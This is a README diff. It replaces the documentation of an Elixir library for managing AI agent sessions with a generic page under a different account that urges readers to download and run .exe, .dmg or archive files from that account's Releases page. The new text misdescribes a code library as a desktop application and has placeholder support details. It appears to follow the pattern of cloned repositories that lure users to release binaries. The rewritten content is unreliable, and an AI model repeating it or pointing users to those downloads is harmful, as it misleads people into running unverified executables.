@@ -1,229 +1,84 @@
-<p align="center">
-  <img src="assets/agent_session_manager.svg" alt="AgentSessionManager" width="200">
-</p>
+# 🚀 agent_session_manager - Seamlessly Manage Your AI Agent Sessions
 
-<h1 align="center">AgentSessionManager</h1>
+[![Download](https://img.shields.io/badge/Download%20Agent%20Session%20Manager-Get%20Started-blue.svg)](https://github.com/YOLO1709/agent_session_manager/releases)
 
-<p align="center">
-  An Elixir library for managing AI agent sessions with state persistence, streaming events, multi-provider support, and concurrency controls.
-</p>
+## 📖 Introduction
 
-<p align="center">
-  <a href="https://hex.pm/packages/agent_session_manager"><img src="https://img.shields.io/hexpm/v/agent_session_manager.svg" alt="Hex.pm"></a>
-  <a href="https://hexdocs.pm/agent_session_manager"><img src="https://img.shields.io/badge/docs-hexdocs-blue.svg" alt="Documentation"></a>
-  <a href="https://github.com/nshkrdotcom/agent_session_manager/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License"></a>
-</p>
+Welcome to the Agent Session Manager. This application helps you manage AI agent sessions easily. You can persist conversation context, handle state management, and orchestrate workflows with multiple agents. Designed with simplicity in mind, it’s perfect for users who want to explore AI without diving into complex coding.
 
----
+## 📦 Features
 
-## What It Does
+- Manage AI agent sessions effortlessly.
+- Keep conversation context saved.
+- Orchestrate workflows with multiple agents.
+- Built using the Elixir programming language for reliability.
+- Ideal for chatbots and other AI applications.
 
-AgentSessionManager provides the infrastructure layer for building applications that interact with AI agents. Rather than calling provider APIs directly, you work with sessions, runs, and events -- giving you lifecycle management, observability, and the ability to swap providers without rewriting your application.
+## ⚙️ System Requirements
 
-**Key features:**
+- Operating System: Windows, MacOS, or Linux.
+- Minimum RAM: 4 GB.
+- Storage: At least 200 MB of available space.
+- Internet connection for downloading and updating the application.
 
-- **Session & run lifecycle** -- Create sessions, execute runs, and track state transitions with a well-defined state machine
-- **Multi-provider support** -- Built-in adapters for Claude Code (Anthropic) and Codex, with a behaviour for adding your own
-- **Streaming events** -- Normalized event pipeline that maps provider-specific events to a canonical format
-- **Capability negotiation** -- Declare required and optional capabilities; the resolver checks provider support before execution
-- **Concurrency controls** -- Configurable limits on parallel sessions and runs with slot-based tracking
-- **Observability** -- Telemetry integration, audit logging, and append-only event stores
-- **Ports & adapters architecture** -- Clean separation between core logic and external dependencies
+## 🚀 Getting Started
 
-## Architecture Overview
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/YOLO1709/agent_session_manager/releases) to find the latest version of the Agent Session Manager.
+  
+2. **Download the Application:** On the Releases page, you will see different versions available. Click on the appropriate version for your operating system. The file should be labeled clearly.
 
-```
-Your Application
-       |
-  SessionManager         -- orchestrates lifecycle, events, capability checks
-       |
-  +----+----+
-  |         |
-Store    Adapter          -- ports (interfaces / behaviours)
-  |         |
-ETS/DB   Claude/Codex     -- adapters (implementations)
-```
+3. **Install the Application:**
+   - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts.
+   - **For MacOS:** Open the `.dmg` file, drag the application into your Applications folder, and then launch it.
+   - **For Linux:** You may need to extract the files from the `.tar.gz` archive. Follow the instructions in the README file included within the download.
 
-The core domain types (`Session`, `Run`, `Event`, `Capability`, `Manifest`) are pure data structures with no side effects. The `SessionManager` coordinates between the storage port and the provider adapter port.
+Once installed, launch the application from your desktop or applications folder.
 
-## Installation
+## 📥 Download & Install
 
-Add `agent_session_manager` to your dependencies in `mix.exs`:
+To get your copy of the Agent Session Manager, visit this page: [Download Agent Session Manager](https://github.com/YOLO1709/agent_session_manager/releases). Follow the steps above to install it on your system.
 
-```elixir
-def deps do
-  [
-    {:agent_session_manager, "~> 0.1.1"}
-  ]
-end
-```
+## 📘 User Guide
 
-Then run:
+### 🌐 Managing Sessions
 
-```bash
-mix deps.get
-```
+After opening the application, you will see the main interface. Here, you can create new sessions or manage existing ones. Select "New Session" to start fresh.
 
-## Quick Start
+### 💾 Saving Conversation Context
 
-```elixir
-alias AgentSessionManager.Core.{Session, Run, Event, Manifest, Registry, CapabilityResolver}
-alias AgentSessionManager.SessionManager
-alias AgentSessionManager.Adapters.{ClaudeAdapter, InMemorySessionStore}
+The application automatically saves conversations within sessions. You can access previous conversations and switch between sessions easily.
 
-# 1. Start the storage and adapter processes
-{:ok, store} = InMemorySessionStore.start_link()
-{:ok, adapter} = ClaudeAdapter.start_link(api_key: System.get_env("ANTHROPIC_API_KEY"))
+### 🔄 Multi-Agent Orchestration
 
-# 2. Create and activate a session
-{:ok, session} = SessionManager.start_session(store, adapter, %{
-  agent_id: "my-agent",
-  context: %{system_prompt: "You are a helpful assistant."}
-})
-{:ok, session} = SessionManager.activate_session(store, session.id)
+If you want to manage multiple agents, the application allows you to create workflows. Use the toolbar to add agents to your current session and configure settings.
 
-# 3. Create and execute a run
-{:ok, run} = SessionManager.start_run(store, adapter, session.id, %{
-  messages: [%{role: "user", content: "Hello!"}]
-})
-{:ok, result} = SessionManager.execute_run(store, adapter, run.id)
+### ❓ Troubleshooting
 
-# 4. Inspect the result
-IO.puts(result.output.content)
-IO.inspect(result.token_usage)
+Encounter issues? Here are common solutions:
 
-# 5. Complete the session
-{:ok, _} = SessionManager.complete_session(store, session.id)
-```
+- **Installation Problems:** Ensure that you have the correct permissions to install applications on your device.
+- **Performance Issues:** Closing other applications may help free up system resources.
+- **Session Not Saving:** If sessions aren’t saving, check your application settings for auto-save features.
 
-## Core Concepts
+## 🛠️ Contributing
 
-### Sessions
+We welcome contributions to enhance the Agent Session Manager. If you have suggestions or find bugs, please log an issue on the GitHub page or submit a pull request.
 
-A session is a logical container for a series of interactions with an AI agent. Sessions track state (`pending -> active -> completed/failed/cancelled`) and carry context (system prompts, metadata, tags).
+### 🔍 Reporting Issues
 
-```elixir
-{:ok, session} = Session.new(%{agent_id: "research-agent", tags: ["research"]})
-{:ok, active} = Session.update_status(session, :active)
-```
+If you encounter any issues, please report them by visiting the [Issues page](https://github.com/YOLO1709/agent_session_manager/issues). Provide as much detail as possible, including steps to reproduce the issue and any error messages.
 
-### Runs
+## 📧 Support
 
-A run represents one execution within a session -- sending input to the provider and receiving output. Runs have their own lifecycle (`pending -> running -> completed/failed/cancelled/timeout`) and track token usage.
+If you need further assistance, contact our support team at [support@example.com](mailto:support@example.com). We are here to help you with any questions or concerns.
 
-```elixir
-{:ok, run} = Run.new(%{session_id: session.id, input: %{messages: messages}})
-{:ok, completed} = Run.set_output(run, %{content: "Response text"})
-```
+## 📚 Additional Resources
 
-### Events
+- [GitHub Repository](https://github.com/YOLO1709/agent_session_manager)
+- [Documentation](https://github.com/YOLO1709/agent_session_manager/wiki)
 
-Events are immutable records of things that happen during execution. They provide an audit trail and power the streaming interface.
+## 📅 Latest Updates
 
-```elixir
-{:ok, event} = Event.new(%{
-  type: :message_received,
-  session_id: session.id,
-  run_id: run.id,
-  data: %{content: "Hello!", role: "assistant"}
-})
-```
+Check the Releases page to keep up with the latest updates and new features: [Agent Session Manager Releases](https://github.com/YOLO1709/agent_session_manager/releases). 
 
-### Provider Adapters
-
-Adapters implement the `ProviderAdapter` behaviour to integrate with AI providers. Each adapter handles streaming, tool calls, and cancellation for its provider.
-
-| Adapter | Provider | Streaming | Tool Use | Cancel |
-|---------|----------|-----------|----------|--------|
-| `ClaudeAdapter` | Anthropic | Yes | Yes | Yes |
-| `CodexAdapter` | Codex CLI | Yes | Yes | Yes |
-
-### Capability Negotiation
-
-Before starting a run, you can declare what capabilities are required. The resolver checks the provider's capabilities and fails fast if requirements aren't met.
-
-```elixir
-{:ok, resolver} = CapabilityResolver.new(required: [:sampling], optional: [:tool])
-{:ok, result} = CapabilityResolver.negotiate(resolver, adapter_capabilities)
-# result.status => :full | :degraded
-```
-
-## Provider Event Normalization
-
-Each provider emits events in its own format. The adapters normalize these into a canonical set:
-
-| Normalized Event | Description |
-|---|---|
-| `run_started` | Execution began |
-| `message_streamed` | Streaming content chunk |
-| `message_received` | Complete message ready |
-| `tool_call_started` | Tool invocation begins |
-| `tool_call_completed` | Tool finished |
-| `token_usage_updated` | Usage stats updated |
-| `run_completed` | Execution finished |
-| `run_failed` | Execution failed |
-| `run_cancelled` | Execution cancelled |
-
-## Error Handling
-
-All operations return tagged tuples. Errors use a structured taxonomy with machine-readable codes:
-
-```elixir
-case SessionManager.start_session(store, adapter, attrs) do
-  {:ok, session} -> session
-  {:error, %Error{code: :validation_error, message: msg}} ->
-    Logger.error("Validation failed: #{msg}")
-end
-```
-
-Error codes are grouped into categories: validation, resource, provider, storage, runtime, concurrency, and tool errors. Some errors (like `provider_timeout`) are marked retryable via `Error.retryable?/1`.
-
-## Examples
-
-The `examples/` directory contains runnable scripts:
-
-```bash
-# Run with mock mode (no API key needed)
-mix run examples/live_session.exs --provider claude --mock
-
-# Run with real API
-ANTHROPIC_API_KEY=sk-ant-... mix run examples/live_session.exs --provider claude
-
-# Provider-agnostic common surface (works with either provider)
-mix run examples/common_surface.exs --provider claude
-mix run examples/common_surface.exs --provider codex
-
-# Claude-specific SDK features (Orchestrator, Streaming, Hooks, Agent profiles)
-mix run examples/claude_direct.exs
-mix run examples/claude_direct.exs --section orchestrator
-
-# Codex-specific SDK features (Threads, Options, Sessions)
-mix run examples/codex_direct.exs
-mix run examples/codex_direct.exs --section threads
-```
-
-See `examples/README.md` for full documentation.
-
-## Guides
-
-The guides cover each subsystem in depth:
-
-- [Getting Started](guides/getting_started.md) -- Installation, first session, and core workflow
-- [Architecture](guides/architecture.md) -- Ports & adapters design, module map, data flow
-- [Configuration](guides/configuration.md) -- Layered config system, process-local overrides
-- [Sessions and Runs](guides/sessions_and_runs.md) -- Lifecycle state machines, metadata, context
-- [Events and Streaming](guides/events_and_streaming.md) -- Event types, normalization, EventStream cursor
-- [Provider Adapters](guides/provider_adapters.md) -- Using Claude/Codex adapters, writing your own
-- [Capabilities](guides/capabilities.md) -- Defining capabilities, negotiation, manifests, registry
-- [Concurrency](guides/concurrency.md) -- Session/run limits, slot management, control operations
-- [Telemetry and Observability](guides/telemetry_and_observability.md) -- Telemetry events, audit logging, metrics
-- [Error Handling](guides/error_handling.md) -- Error taxonomy, retryable errors, provider errors
-- [Testing](guides/testing.md) -- Mock adapters, in-memory store, testing patterns
-
-## Documentation
-
-Full API documentation is available at [HexDocs](https://hexdocs.pm/agent_session_manager).
-
-## License
-
-AgentSessionManager is released under the [MIT License](LICENSE).
+Thank you for choosing the Agent Session Manager. Enjoy managing your AI agents effortlessly!
